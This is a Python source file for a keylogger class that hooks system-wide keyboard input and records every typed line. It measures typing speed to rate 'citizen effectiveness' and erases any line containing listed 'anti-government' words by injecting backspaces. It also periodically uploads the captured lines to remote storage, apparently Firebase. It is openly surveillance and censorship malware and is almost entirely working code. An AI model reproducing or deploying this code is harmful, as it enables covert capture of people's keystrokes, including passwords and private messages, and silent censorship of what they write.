from typing import List
import keyboard
import time
from difflib import SequenceMatcher

"""
SHIFT_PUNCTUATION is a key literal list containing every shift + key combination
"""
SHIFT_PUNCTUATION = ['!', '"', '§', '$', '%', '&', '/', '(', ')', '=', '?', ';', ':', '_', '`', '*', '\'']

"""
Checks if a string contains a substring, if it containes returnes true, else returns false
"""
def contains(line: str, sub: str):
    try:
        index = line.index(sub)
        return True
    except:
        return False

"""
Calculate the words per minute of a list of strings
"""
def wpm(lines: List[str], recordingEnd, recordingStart):
    words = []
    for line in lines:
        words.extend(line.split(" "))
    words = list(filter(None, words))
    wordsPerMinute = len(words) / ((recordingEnd - recordingStart) / 60)
    return wordsPerMinute

"""
By using the 'Gestalt pattern recognition' evaluates if two strings are near-equal to each other.
Example: 'apple' and 'appel' have a ration of above 0.80
"""
def similar(a: str, b: str):
    return SequenceMatcher(None, a, b).ratio() > 0.75

"""
This sub-section the keylogger script contains helper methods to navigate in a text
"""
def moveRight(len: int):
    for i in range(0, len):
        keyboard.press_and_release("right")

def moveLeft(len: int):
    for i in range(0, len):
        keyboard.press_and_release("left")

def moveUp(len: int):
    for i in range(0, len):
        keyboard.press_and_release("up")

def moveDown(len: int):
    for i in range(0, len):
        keyboard.press_and_release("down")

"""
Special method to move to the end of the line above the current one.
"""
def moveToUpperRightLineEnd():
    moveUp(1)
    keyboard.press_and_release("end")

"""
A Keylogger that records every key event (Key-Down and Key-Up) and evaluates the written strings.
It censors the users input by abbreviation and deleting such words containing lines completly.
The Keylogger also evaluates the keys usage of this user and their WPM to stipulate about the
citizen effectiveness and productiveness at a point in time.
"""
class KeyLogger():
    def __init__(self, queryController, antiGovernmentWords: List[str], antiGovernmentSentences: List[str]):
        self.queryController = queryController
        self.censorWords = antiGovernmentWords
        self.censorSentences = antiGovernmentSentences
        self.logged = []
        self.keyEvaluation = {}

    """
    Correct a word by deleting and then writing the corrected version. The Input-Cursor needs to be stationed at the end of the word
    """
    def correctWord(self, wrongWord: str, correctWord: str):
        self.deleteWord(wrongWord)
        self.write(correctWord+" ")
        return True

    """
    Self-Implemented method to write strings. Check if a letter is Uppercase or inside the SHIFT_PUNCTUATION list and play the necessary key events
    such as 'shift' and 'KEY'
    """
    def write(self, string: str):
        for c in string:
            if c.isupper() or c in SHIFT_PUNCTUATION:
                keyboard.press("shift")
                keyboard.press_and_release(f'{c.lower()}')
                keyboard.release("shift")
            else:
                keyboard.press_and_release(f'{c}')

    """
    Check if the users input containes any bad word or sentence, censoring the input by deleting the line.
    Effective censoring
    """
    def censorInput(self, line: str):
        for badString in self.censorSentences:
            index = line.find(badString)
            if index > -1:
                self.deleteLine(line)
        for badWord in self.censorWords:
            if line.find(badWord) >= 0:
                self.deleteLine(line)

    """
    Evaluate a keys usage by counting the occurence of the character assigned to the key
    """
    def evaluateKeyUsage(self, stringList: List[str]):
        for str in stringList:
            for c in str:
                count = str.count(c)
                if c not in self.keyEvaluation:
                    self.keyEvaluation[c] = count
                else:
                    oldCount = self.keyEvaluation[c]
                    self.keyEvaluation[c] = oldCount + count
        return self.keyEvaluation

    """
    Deleting a word. Delete a word by pressing len(word) times 'backspace'
    """
    def deleteWord(self, word: str):
        length = len(word)
        for _ in range(0, length):
            keyboard.press_and_release("backspace")
        keyboard.press_and_release("delete")
        return True

    """
    Deleting a line. Delete a word by pressing len(line) times 'backspace'
    """
    def deleteLine(self, line: str):
        length = len(line)
        for _ in range(0, length+1):
            keyboard.press_and_release("backspace")

    """
    Check for specific word occurrences in a given string. Return the similar found words
    """
    def checkWordInSentence(self, sentence: str):
        words = sentence.split(" ")
        foundWords = []
        for word in words:
            for anitWord in self.censorWords:
                if similar(word, anitWord):
                    foundWords.append(word)
        return foundWords

    """
    Check for sentence similarity and return a list of such sentences
    """
    def checkSentences(self, sentences: List[str]):
        foundSentences = []
        for sentence in sentences:
            for antiSentence in self.censorSentences:
                if similar(sentence, antiSentence):
                    foundSentences.append(sentence)
        return foundSentences

    """
    Main attraction of the Keylogger Class. Read the key input stream of the windows I/O hook.
    Evaluate the wpm, key usage and such. Deduct the written strings. Censor by abbreviation and
    deleting lines if input conataines non-allowed (sub-) strings
    """
    def readKeyInput(self):
        for badWord in self.censorWords:
            keyboard.add_abbreviation(badWord, "")
        for badSentence in self.censorSentences:
            keyboard.add_abbreviation(badSentence, "")
        keyboard.remap_key("tab", "space+space+space+space")
        while 1:
            lines = []
            recordingStart = time.time()
            keyboard.start_recording()
            keyboard.wait("enter")
            keyEvents = keyboard.stop_recording()
            recordingEnd = time.time()
            typedStrings = keyboard.get_typed_strings(keyEvents)
            for line in typedStrings:
                if len(line) > 0:
                    lines.append(line)
            if contains(line, "konami"):
                    return
            self.censorInput(lines[0])
            keyEvaluation = self.evaluateKeyUsage(lines)
            WPM = wpm(lines, recordingEnd, recordingStart)
            yield lines[0]

    """
    Initiating a generator object with the readKeyInput method. After a enter key is pressed,
    upload the deducted line to the firebase data storage solution
    """
    def main(self):
        input = self.readKeyInput()
        log = []
        counter = 0
        for i in input:
            if len(i) > 0:
                log.append(i)
            if counter % 5 == 0:
                self.queryController.addToKeyLogs(log)
                counter = 0
                log.clear()
            counter = counter + 1